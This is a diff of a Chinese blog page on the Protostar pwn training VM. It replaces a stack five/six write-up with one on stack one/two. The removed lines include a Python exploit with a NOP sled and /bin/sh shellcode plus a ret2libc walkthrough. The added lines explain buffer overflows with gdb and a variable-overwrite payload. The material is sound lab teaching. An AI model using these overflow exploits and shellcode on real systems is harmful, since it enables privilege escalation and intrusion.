@@ -4,10 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="8023">
-    <meta name="description" content="Pwn-protostar靶场4 stack five,，stack six，stack sevenStack Five程序静态分析#include &amp;lt;stdlib.h&gt;
-#include &amp;lt;unistd.h&gt;
-#include">
+    <meta name="keywords" content="Pwn-protostar靶场2 stack one，stack two, 8023">
+    <meta name="description" content="
+
+Pwn-protostar靶场2 stack one，stack two什么是缓冲区溢出当系统向缓冲区写入的数据多于它可以容纳的数据时，就会发生缓冲区溢出或缓冲区溢出，用更简单的话说就是在程序运行时，系统会为程序在内存里生成一个固定空间">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>8023</title>
+    <title>Pwn-protostar靶场2 stack one，stack two | 8023</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
 
@@ -305,12 +305,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">Pwn-protostar靶场2 stack one，stack two</h1>
                 </div>
             </div>
         </div>
@@ -332,12 +332,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                学习
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -346,21 +359,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-01-03
+                    2024-11-12
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-11-13
+                    2025-01-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.4k
+                    2.1k
                 </div>
                 
 
@@ -410,199 +423,197 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Pwn-protostar靶场4-stack-five-，stack-six，stack-seven"><a href="#Pwn-protostar靶场4-stack-five-，stack-six，stack-seven" class="headerlink" title="Pwn-protostar靶场4 stack five,，stack six，stack seven"></a>Pwn-protostar靶场4 stack five,，stack six，stack seven</h1><h2 id="Stack-Five"><a href="#Stack-Five" class="headerlink" title="Stack Five"></a>Stack Five</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+                <span id="more"></span>
+
+<h1 id="Pwn-protostar靶场2-stack-one，stack-two"><a href="#Pwn-protostar靶场2-stack-one，stack-two" class="headerlink" title="Pwn-protostar靶场2 stack one，stack two"></a>Pwn-protostar靶场2 stack one，stack two</h1><h3 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是<strong>缓冲区溢出</strong></h3><p>当系统<strong>向缓冲区写入的数据多于它可以容纳的数据时</strong>，就会发生缓冲区溢出或缓冲区溢出，用更简单的话说就是在程序运行时，系统会为程序在内存里<strong>生成一个固定空间</strong>，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作</p>
+<h3 id="什么是寄存器"><a href="#什么是寄存器" class="headerlink" title="什么是寄存器"></a>什么是寄存器</h3><p>寄存器是内存中非常靠近cpu的区域，因此可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限</p>
+<p>计算机寄存器是位于CPU内部的一组用于存储和处理数据的高速存储器。用于存放指令、数据和运算结果</p>
+<p>常见的寄存器名称以及作用：</p>
+<pre class="line-numbers language-none"><code class="language-none">累加器寄存器（Accumulator Register，EAX）：用于存储操作数和运算结果，在算术和逻辑操作中经常使用。
+
+基址指针寄存器（Base Pointer Register，EBP）：用于指向堆栈帧的基地址，通常用于函数调用和局部变量访问。
+
+堆栈指针寄存器（Stack Pointer Register，ESP）：指向当前活动堆栈的栈顶地址，在函数调用和参数传递中经常使用。
+
+数据寄存器（Data Register，EDX、ECX、EBX）：用于存储数据，在算术和逻辑操作中经常使用。
+
+指令指针寄存器（Instruction Pointer Register，EIP）：存储当前要执行的指令的内存地址，用于指示下一条要执行的指令。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Stack-One"><a href="#Stack-One" class="headerlink" title="Stack One"></a>Stack One</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>stack one源码：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
+  <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"please specify an argument\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
 
-<p>这个程序很简单，只有两行，作用只是接受我们的输入</p>
-<h4 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a>setuid</h4><p>什么是setuid？</p>
-<pre class="line-numbers language-none"><code class="language-none">setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<p> 这么说起来有点绕，我们来举一个例子 </p>
-<pre class="line-numbers language-none"><code class="language-none">一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x61626364</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have correctly got the variable to the right value\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again, you got 0x%08x\n"</span><span class="token punctuation">,</span> modified<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731486145052.png" alt="1731486145052"></p>
-<p> r代表读，w代表写，x代表执行，那s是什么呢 </p>
-<pre class="line-numbers language-none"><code class="language-none">s替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><p>首先程序定义了两个函数变量</p>
+<pre class="line-numbers language-none"><code class="language-none">volatile int modified;
+char buffer[64];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的     <strong>我们的目标就是，破解这些文件然后拿到root权限</strong> </p>
-<h4 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h4><p>可以把栈想象成一个堆积的书本，你可以把新的书本放在最顶部，也可以取出最顶部的书本。(也可以想象成扑克牌，同理，怎么好理解怎么理解)</p>
-<p>当程序执行时，它会使用栈来跟踪函数调用和变量的值。每次你调用一个函数，计算机会在栈上创建一个新的“帧”（就像书本一样），用来存储这个函数的局部变量和执行时的一些信息。当函数执行完毕时，这个帧会被从栈上移除，就像取出一本书本一样。</p>
-<p>栈通常是“后进先出”的，这意味着最后放入栈的数据会最先被取出。这是因为栈的操作是非常快速和高效的，所以它经常用于管理函数调用和跟踪程序执行流程</p>
-<h4 id="为什么要覆盖ret返回地址"><a href="#为什么要覆盖ret返回地址" class="headerlink" title="为什么要覆盖ret返回地址"></a>为什么要覆盖ret返回地址</h4><p>覆盖 ret 返回地址是一种计算机攻击技巧，攻击者利用它来改变程序执行的路径。这个过程有点像将一个路标或导航指令替换成你自己的指令，以便程序执行到你想要的地方。</p>
-<p>想象一下，你在开车时遇到一个交叉路口，路标告诉你向左拐才能到达目的地。但是，攻击者可能会悄悄地改变路标，让你误以为需要向右拐。当你按照这个伪装的路标行驶时，你最终会到达攻击者想要的地方，而不是你本来的目的地。</p>
-<p>在计算机中，程序执行的路径通常是通过返回地址控制的，这个返回地址告诉计算机在函数执行完毕后应该继续执行哪里的代码。攻击者可以通过修改这个返回地址，迫使程序跳转到他们指定的地方，通常是一段恶意代码，而不是正常的程序代码</p>
-<h3 id="获取ret返回地址"><a href="#获取ret返回地址" class="headerlink" title="获取ret返回地址"></a>获取ret返回地址</h3><p>使用gdb打开程序，在执行leave指令的地方下一个断点</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731486503524.png" alt="1731486503524"></p>
-<p> 运行程序，随便输入一些字符，然后查看栈状态 </p>
-<pre class="line-numbers language-none"><code class="language-none">x&#x2F;25wx $esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>整数型变量 modified 和字符型变量buffer，其中字符型变量buffer的字符存储最大为64个字节，然后程序检测了我们输入的参数</p>
+<pre class="line-numbers language-none"><code class="language-none">if(argc &#x3D;&#x3D; 1) &#123;
+    errx(1, &quot;please specify an argument\n&quot;);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731486596363.png" alt="1731486596363"></p>
-<p>然后重新加载程序，在ret下断点，查看寄存器中程序跳转地址</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731486753023.png" alt="1731486753023"></p>
-<p>由上面两图可以计算出需要80个字符才能完全覆盖ret返回地址， 然后再将我们的shellcode放到控制数据的堆栈里 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731486937170.png" alt="1731486937170"></p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731486852593.png" alt="1731486852593"></p>
-<h4 id="nop指令"><a href="#nop指令" class="headerlink" title="nop指令"></a>nop指令</h4><p>NOP指令是一种特殊的机器指令，它在计算机中执行时不做任何操作。简单来说，NOP指令是一种“空操作”，它不改变计算机的状态、不影响寄存器的值，也不执行任何计算或跳转</p>
-<p>为了防止我们shellcode收到干扰，我们在shellcode代码前添加一些nop指令即可</p>
-<h3 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct
+<p>如果我们只运行程序，不输入参数就会输出please specify an argument并结束程序</p>
+<p>之后程序定义了一个变量和进行了一个字符串复制操作</p>
+<pre class="line-numbers language-none"><code class="language-none">modified &#x3D; 0;
+strcpy(buffer, argv[1]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-padding <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">76</span>
-eip <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"I"</span><span class="token punctuation">,</span><span class="token number">0xbffff7c0</span><span class="token punctuation">)</span>
-nopnop <span class="token operator">=</span> <span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">64</span>
-payload <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x88"</span>
+<p>modified变量为0，然后将我们输入的参数复制到buffer变量里</p>
+<p>然后程序做了一个简单的if判断</p>
+<pre class="line-numbers language-none"><code class="language-none">if(modified &#x3D;&#x3D; 0x61626364) &#123;
+    printf(&quot;you have correctly got the variable to the right value\n&quot;);
+&#125; else &#123;
+    printf(&quot;Try again, you got 0x%08x\n&quot;, modified);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token keyword">print</span> padding<span class="token operator">+</span>eip<span class="token operator">+</span>nopnop<span class="token operator">+</span>payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果modified变量等于0x61626364就输出you have correctly got the variable to the right value，代表着我们破解成功<br>0x61626364是十六进制，转换字符串是abcd</p>
+<p>也就是说，我们使modified变量变成abcd就成功了，但是modified变量设置为0，这里我们就需要栈溢出覆盖变量原本设置的值 </p>
+<h4 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h4><p>使用gdb打开程序，输入指令查看汇编代码</p>
+<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel
+disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>首先设置一个76位的垃圾字符，然后利用struct模块的pack功能，作用是将一个无符号整数（I 表示无符号整数）转换为二进制数据，跳转到控制数据的栈里，最后写入nop指令和shellcode代码，shellcode代码可以在这个网站里找到 </p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;shell-storm.org&#x2F;shellcode&#x2F;files&#x2F;shellcode-811.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/img/1731309891684.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">0x08048464 &lt;main+0&gt;:    push   ebp
+0x08048465 &lt;main+1&gt;:    mov    ebp,esp
+0x08048467 &lt;main+3&gt;:    and    esp,0xfffffff0
+0x0804846a &lt;main+6&gt;:    sub    esp,0x60
+0x0804846d &lt;main+9&gt;:    cmp    DWORD PTR [ebp+0x8],0x1
+0x08048471 &lt;main+13&gt;:   jne    0x8048487 &lt;main+35&gt;
+0x08048473 &lt;main+15&gt;:   mov    DWORD PTR [esp+0x4],0x80485a0
+0x0804847b &lt;main+23&gt;:   mov    DWORD PTR [esp],0x1
+0x08048482 &lt;main+30&gt;:   call   0x8048388 &lt;errx@plt&gt;
+0x08048487 &lt;main+35&gt;:   mov    DWORD PTR [esp+0x5c],0x0
+0x0804848f &lt;main+43&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048492 &lt;main+46&gt;:   add    eax,0x4
+0x08048495 &lt;main+49&gt;:   mov    eax,DWORD PTR [eax]
+0x08048497 &lt;main+51&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x0804849b &lt;main+55&gt;:   lea    eax,[esp+0x1c]
+0x0804849f &lt;main+59&gt;:   mov    DWORD PTR [esp],eax
+0x080484a2 &lt;main+62&gt;:   call   0x8048368 &lt;strcpy@plt&gt;
+0x080484a7 &lt;main+67&gt;:   mov    eax,DWORD PTR [esp+0x5c]
+0x080484ab &lt;main+71&gt;:   cmp    eax,0x61626364
+0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;
+0x080484b2 &lt;main+78&gt;:   mov    DWORD PTR [esp],0x80485bc
+0x080484b9 &lt;main+85&gt;:   call   0x8048398 &lt;puts@plt&gt;
+0x080484be &lt;main+90&gt;:   jmp    0x80484d5 &lt;main+113&gt;
+0x080484c0 &lt;main+92&gt;:   mov    edx,DWORD PTR [esp+0x5c]
+0x080484c4 &lt;main+96&gt;:   mov    eax,0x80485f3
+0x080484c9 &lt;main+101&gt;:  mov    DWORD PTR [esp+0x4],edx
+0x080484cd &lt;main+105&gt;:  mov    DWORD PTR [esp],eax
+0x080484d0 &lt;main+108&gt;:  call   0x8048378 &lt;printf@plt&gt;
+0x080484d5 &lt;main+113&gt;:  leave
+0x080484d6 &lt;main+114&gt;:  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731487160482.png" alt="1731487160482"></p>
-<p>这是一个linux x86架构执行/bin/sh的shellcode</p>
-<p>如果我们直接运行脚本是得不到/bin/sh的<img src="F:\Desktop\工具\二进制和逆向\img\1731487346049.png" alt="1731487346049"></p>
-<p> 其实/bin/sh已经执行了，只是没有输入，我们可以用cat命令来重定向到标准输入输出 </p>
-<pre class="line-numbers language-none"><code class="language-none">(python stack5exp.py ; cat) | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> 程序最关键的地方在这里 </p>
+<pre class="line-numbers language-none"><code class="language-none">0x080484a7 &lt;main+67&gt;:   mov    eax,DWORD PTR [esp+0x5c]
+0x080484ab &lt;main+71&gt;:   cmp    eax,0x61626364
+0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731487445527.png" alt="1731487445527"></p>
-<p> 成功破解程序 </p>
-<h2 id="Stack-Six"><a href="#Stack-Six" class="headerlink" title="Stack Six"></a>Stack Six</h2><p>Stack Six和Stack Seven的源代码是一样的，可以通过ret to libc的方式获取shell</p>
-<h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<p>它使用mov指令将esp+0x5c栈内地址的值移动到eax寄存器里，然后用cmp指令将eax寄存器里的值与0x61626364做对比，如果对比的值不一样就执行jne指令跳转到0x80484c0地址继续执行其他指令 </p>
+<h3 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>我们先在程序执行对比指令的地址下一个断点</p>
+<pre class="line-numbers language-none"><code class="language-none">b *0x080484ab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 然后设置一下自动运行我们设置的命令 </p>
+<pre class="line-numbers language-none"><code class="language-none">define hook-stop
+info registers   &#x2F;&#x2F;显示寄存器里的地址
+x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
+x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
+end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/1731310142307.png"></p>
+<p>然后执行程序，输入参数</p>
+<pre class="line-numbers language-none"><code class="language-none">r aaaaaaaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/1731310302953.png"></p>
+<p>程序执行到我们设置的断点处自动执行了我们上面设置的命令，在这里可以看到我们输入的8个大写A在栈中的位置，并且eax寄存器里的值为0</p>
+<p>之前说过，程序将esp+0x5c地址处的值移动到了eax寄存器里，然后执行对比指令</p>
+<p> 我们查看esp+0x5c地址存放的值 </p>
+<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/1731310378730.png"></p>
+<p> esp+0x5c地址就是栈里的0xbffff78c，每一段存放四个字符，c代表的是12 </p>
+<p>从存放我们输入的值的栈地址到esp+0x5c，中间共有64个字符，也就是说，我们需要输出64个字符+4个我们指定的字符才能覆盖modified变量 </p>
+<p><strong>在这里还有一个知识点是在x86架构里，读取是由低到高的，要使modified变量变成0x61626364，不能直接输入abcd，而是dcba</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('a'*(4*16)+'dcba')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/1731310551190.png"></p>
+<p>成功破解！</p>
+<h2 id="Stack-Two"><a href="#Stack-Two" class="headerlink" title="Stack Two"></a>Stack Two</h2><h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
-<span class="token keyword">void</span> <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//定义一个名为getpath的函数</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
+  <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>variable<span class="token punctuation">;</span>
 
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input path please: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出字符串input path please: </span>
+  variable <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"GREENIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取用户输入，将输入存储到buffer函数变量里</span>
-
-  ret <span class="token operator">=</span> <span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//获取ret返回的内存地址</span>
-
-  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ret <span class="token operator">&amp;</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbf000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//如果内存地址的前两位是0xbf</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bzzzt (%p)\n"</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出bzzzt</span>
-    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>variable <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"please set the GREENIE environment variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
 
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"got path %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//输出got path</span>
-<span class="token punctuation">&#125;</span>
+  modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  <span class="token comment">//主函数</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token function">getpath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用getpath函数</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> variable<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<h4 id="ret-to-libc"><a href="#ret-to-libc" class="headerlink" title="ret to libc"></a>ret to libc</h4><p>ret to libc是将程序的返回地址覆盖为标准 C 库中的某个函数的地址，如 “system” 函数，这个函数可以用来执行系统命令。然后，攻击者构造一个有效的参数，比如”<strong>/bin/sh</strong>“，将其传递给 “<strong>system</strong>” 函数，从而获取shell</p>
-<h3 id="寻找system函数地址和-bin-sh字符串"><a href="#寻找system函数地址和-bin-sh字符串" class="headerlink" title="寻找system函数地址和/bin/sh字符串"></a>寻找system函数地址和/bin/sh字符串</h3><p>用gdb打开程序，在getpath函数执行leave指令的地址打一个断点</p>
-<pre class="line-numbers language-none"><code class="language-none">disassemble getpath
-b *0x080484f8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731487814323.png" alt="1731487814323"></p>
-<p> 运行程序后随意输入一些字符串，然后寻找system函数的地址 </p>
-<pre class="line-numbers language-none"><code class="language-none">r
-p system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731487888937.png" alt="1731487888937"></p>
-<p>system函数地址为：<strong>0xb7ecffb0</strong>，找到了system函数地址，现在我们就要找让system函数执行命令的字符串，为了获取shell，我们寻找”<strong>/bin/sh</strong>“字符串</p>
-<h4 id="什么是内存映射"><a href="#什么是内存映射" class="headerlink" title="什么是内存映射"></a>什么是内存映射</h4><p>内存映射是一种操作系统和计算机体系结构中常见的技术，用于将文件或其他设备的内容映射到进程的地址空间，使得进程可以像访问内存一样访问这些内容</p>
